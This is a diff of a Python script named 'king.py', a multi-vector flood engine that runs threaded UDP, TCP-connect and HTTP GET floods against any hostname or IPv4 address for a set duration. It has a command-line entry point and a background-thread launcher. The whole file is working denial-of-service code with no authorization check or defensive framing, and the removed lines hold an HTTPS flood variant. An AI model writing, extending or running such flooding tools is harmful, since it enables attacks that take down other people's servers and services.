@@ -1,130 +1,296 @@
 #!/usr/bin/env python3
+"""
+king.py — multi-vector flood engine (UDP, TCP, HTTP).
+
+Signature:
+    attack(target, port, duration, threads=100, payload_size=1024, vector="udp") -> int
+
+Targets accept:
+    '1.2.3.4', '1.2.3.4:443', 'host.com', 'host.com:443'
+
+IPv6 rejected with ValueError.
+
+Vectors:
+    udp  — raw datagram flood
+    tcp  — connect flood
+    http — GET flood over TCP (target must speak HTTP)
+"""
+
 import socket
-import ssl
 import sys
 import threading
 import time
 
 __all__ = ["attack", "start_attack", "_resolve", "VECTORS"]
+
 VECTORS = ("udp", "tcp", "http")
 
+
+# ── target normalization ──────────────────────────────────────────────────
+
 def _resolve(target):
+    """Return IPv4 dotted-quad string. Raises ValueError / gaierror."""
     if not isinstance(target, str) or not target.strip():
         raise ValueError(f"empty target: {target!r}")
+
     t = target.strip()
+
     if t.startswith("["):
         end = t.find("]")
-        if end == -1: raise ValueError(f"malformed IPv6 target: {target!r}")
+        if end == -1:
+            raise ValueError(f"malformed IPv6 target: {target!r}")
         inner = t[1:end]
+        try:
+            socket.inet_pton(socket.AF_INET6, inner)
+        except OSError as e:
+            raise ValueError(f"invalid IPv6 address: {target!r}") from e
         raise ValueError(f"IPv6 target not supported: {target!r}")
+
     if t.count(":") == 1:
         host, _, maybe_port = t.partition(":")
-        if maybe_port.isdigit() and 0 < int(maybe_port) < 65536: t = host
+        if maybe_port.isdigit() and 0 < int(maybe_port) < 65536:
+            t = host
+
     try:
         socket.inet_pton(socket.AF_INET, t)
         return t
-    except OSError: pass
+    except OSError:
+        pass
+
     return socket.gethostbyname(t)
+
+
+# ── common validation ─────────────────────────────────────────────────────
 
 def _validate(target, port, duration, threads):
     try:
-        port = int(port); duration = int(duration); threads = int(threads)
-    except (TypeError, ValueError): raise ValueError("port, duration, threads must be integers")
-    if not (0 < port < 65536): raise ValueError("port out of range")
-    if duration <= 0 or threads <= 0: raise ValueError("duration and threads must be > 0")
+        port = int(port)
+    except (TypeError, ValueError):
+        raise ValueError(f"port must be int, got {port!r}")
+    if not (0 < port < 65536):
+        raise ValueError(f"port out of range: {port}")
+
+    try:
+        duration = int(duration)
+    except (TypeError, ValueError):
+        raise ValueError(f"duration must be int, got {duration!r}")
+    if duration <= 0:
+        raise ValueError(f"duration must be > 0, got {duration}")
+
+    try:
+        threads = int(threads)
+    except (TypeError, ValueError):
+        raise ValueError(f"threads must be int, got {threads!r}")
+    if threads <= 0:
+        raise ValueError(f"threads must be > 0, got {threads}")
+
     ip = _resolve(target)
     return ip, port, duration, threads
 
-# ── UDP ──
-def _udp_worker(sock, ip, port, end_time, payload, stats):
+
+# ── UDP ───────────────────────────────────────────────────────────────────
+
+def _udp_worker(sock, ip, port, end_time, payload):
     while time.time() < end_time:
         try:
-            sock.sendto(payload, (ip, port)); stats["sent"] += 1
-        except OSError as e:
-            stats["errors"] += 1; stats["last_error"] = f"{type(e).__name__}: {e}"
+            sock.sendto(payload, (ip, port))
+        except OSError:
+            pass
+
 
 def attack_udp(ip, port, duration, threads, payload_size=1024):
     end_time = time.time() + duration
     payload = b"\x00" * payload_size
-    stats = {"sent": 0, "errors": 0, "last_error": ""}
+
     socks = []
     for _ in range(threads):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             socks.append(s)
-        except OSError: break
-    if not socks: raise RuntimeError("Socket creation failed")
+        except OSError:
+            break
+
+    if not socks:
+        raise RuntimeError("Socket creation failed")
+
     workers = []
     for s in socks:
-        t = threading.Thread(target=_udp_worker, args=(s, ip, port, end_time, payload, stats), daemon=True)
-        t.start(); workers.append(t)
-    for t in workers: t.join()
-    for s in socks:
-        try: s.close()
-        except: pass
-    return {"workers": len(workers), "sent": stats["sent"], "errors": stats["errors"], "last_error": stats["last_error"]}
+        t = threading.Thread(target=_udp_worker,
+                             args=(s, ip, port, end_time, payload),
+                             daemon=True)
+        try:
+            t.start()
+            workers.append(t)
+        except RuntimeError:
+            break
 
-# ── TCP ──
-def _tcp_worker(ip, port, end_time, stats):
+    if not workers:
+        for s in socks:
+            try:
+                s.close()
+            except OSError:
+                pass
+        raise RuntimeError("Thread creation failed")
+
+    for t in workers:
+        t.join()
+    for s in socks:
+        try:
+            s.close()
+        except OSError:
+            pass
+
+    return len(workers)
+
+
+# ── TCP ───────────────────────────────────────────────────────────────────
+
+def _tcp_worker(ip, port, end_time, counter, lock):
     while time.time() < end_time:
         try:
             c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            c.settimeout(2.0); c.connect((ip, port)); c.send(b"\x00" * 64)
-            try: c.recv(64)
-            except: pass
-            c.close(); stats["sent"] += 1
-        except OSError as e:
-            stats["errors"] += 1; stats["last_error"] = f"{type(e).__name__}: {e}"
+            c.settimeout(2.0)
+            c.connect((ip, port))
+            c.send(b"\x00" * 64)
+            try:
+                c.recv(64)
+            except OSError:
+                pass
+            c.close()
+            with lock:
+                counter[0] += 1
+        except OSError:
+            pass
+
 
 def attack_tcp(ip, port, duration, threads):
     end_time = time.time() + duration
-    stats = {"sent": 0, "errors": 0, "last_error": ""}
+    counter = [0]
+    lock = threading.Lock()
+
     workers = []
     for _ in range(threads):
-        t = threading.Thread(target=_tcp_worker, args=(ip, port, end_time, stats), daemon=True)
-        t.start(); workers.append(t)
-    for t in workers: t.join()
-    return {"workers": len(workers), "sent": stats["sent"], "errors": stats["errors"], "last_error": stats["last_error"]}
+        t = threading.Thread(target=_tcp_worker,
+                             args=(ip, port, end_time, counter, lock),
+                             daemon=True)
+        try:
+            t.start()
+            workers.append(t)
+        except RuntimeError:
+            break
 
-# ── HTTP/HTTPS ──
-def _http_worker(ip, port, end_time, req, stats, use_ssl, host_header):
-    ctx = None
-    if use_ssl:
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+    if not workers:
+        raise RuntimeError("Thread creation failed")
 
+    for t in workers:
+        t.join()
+    return len(workers)
+
+
+# ── HTTP ──────────────────────────────────────────────────────────────────
+
+def _http_worker(ip, port, end_time, req, counter, lock):
     while time.time() < end_time:
         try:
-            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            raw_sock.settimeout(3.0); raw_sock.connect((ip, port))
-            sock = ctx.wrap_socket(raw_sock, server_hostname=host_header) if use_ssl else raw_sock
-            sock.send(req)
-            try: sock.recv(1024)
-            except: pass
-            sock.close(); stats["sent"] += 1
-        except OSError as e:
-            stats["errors"] += 1; stats["last_error"] = f"{type(e).__name__}: {e}"
+            c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            c.settimeout(2.0)
+            c.connect((ip, port))
+            c.send(req)
+            try:
+                c.recv(1024)
+            except OSError:
+                pass
+            c.close()
+            with lock:
+                counter[0] += 1
+        except OSError:
+            pass
 
-def attack_http(ip, port, duration, threads, path="/", custom_host=None):
+
+def attack_http(ip, port, duration, threads, path="/"):
     end_time = time.time() + duration
-    host_header = custom_host if custom_host else ip
-    req = (f"GET {path} HTTP/1.1\r\nHost: {host_header}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n").encode()
-    stats = {"sent": 0, "errors": 0, "last_error": ""}
-    use_ssl = (port == 443)
+    req = (f"GET {path} HTTP/1.1\r\n"
+           f"Host: {ip}\r\n"
+           f"User-Agent: Mozilla/5.0\r\n"
+           f"Connection: keep-alive\r\n\r\n").encode()
+    counter = [0]
+    lock = threading.Lock()
+
     workers = []
     for _ in range(threads):
-        t = threading.Thread(target=_http_worker, args=(ip, port, end_time, req, stats, use_ssl, host_header), daemon=True)
-        t.start(); workers.append(t)
-    for t in workers: t.join()
-    return {"workers": len(workers), "sent": stats["sent"], "errors": stats["errors"], "last_error": stats["last_error"]}
+        t = threading.Thread(target=_http_worker,
+                             args=(ip, port, end_time, req, counter, lock),
+                             daemon=True)
+        try:
+            t.start()
+            workers.append(t)
+        except RuntimeError:
+            break
 
-# ── Dispatcher ──
-def attack(target, port, duration, threads=100, payload_size=1024, vector="udp", custom_host=None):
+    if not workers:
+        raise RuntimeError("Thread creation failed")
+
+    for t in workers:
+        t.join()
+    return len(workers)
+
+
+# ── dispatcher ────────────────────────────────────────────────────────────
+
+def attack(target, port, duration, threads=100, payload_size=1024, vector="udp"):
+    """
+    Unified flood. Blocks for `duration` seconds. Returns worker count.
+
+    vector ∈ ("udp", "tcp", "http")
+    """
     vector = (vector or "udp").lower()
-    if vector not in VECTORS: raise ValueError(f"unknown vector {vector!r}")
+    if vector not in VECTORS:
+        raise ValueError(f"unknown vector {vector!r}; use one of {VECTORS}")
+
     ip, port, duration, threads = _validate(target, port, duration, threads)
 
-    if vector == "udp": return attack_udp(ip, port, duration, threads, payload_size)
-    if vector == "tcp": return attack_tcp(ip, port, duration, threads)
-    return attack_http(ip, port, duration, threads, custom_host=custom_host)
+    if vector == "udp":
+        try:
+            payload_size = int(payload_size)
+        except (TypeError, ValueError):
+            raise ValueError(f"payload_size must be int, got {payload_size!r}")
+        if payload_size <= 0:
+            raise ValueError(f"payload_size must be > 0, got {payload_size}")
+        return attack_udp(ip, port, duration, threads, payload_size)
+
+    if vector == "tcp":
+        return attack_tcp(ip, port, duration, threads)
+
+    return attack_http(ip, port, duration, threads)
+
+
+def start_attack(target, port, duration, threads=100,
+                 payload_size=1024, vector="udp"):
+    """Non-blocking. Returns the Thread. Exceptions are NOT propagated."""
+    t = threading.Thread(target=attack,
+                         args=(target, port, duration, threads, payload_size, vector),
+                         daemon=True)
+    t.start()
+    return t
+
+
+# ── CLI ───────────────────────────────────────────────────────────────────
+
+def _main(argv):
+    if len(argv) not in (5, 6):
+        print(f"Usage: {argv[0]} <target> <port> <duration> <threads> [vector]")
+        return 1
+    target, port, duration, threads = argv[1:5]
+    vector = argv[5] if len(argv) == 6 else "udp"
+    try:
+        n = attack(target, int(port), int(duration), int(threads), vector=vector)
+    except (ValueError, RuntimeError, socket.gaierror) as e:
+        print(f"Error: {e}", file=sys.stderr)
+        return 2
+    print(f"dispatched {n} workers  vector={vector}")
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(_main(sys.argv))
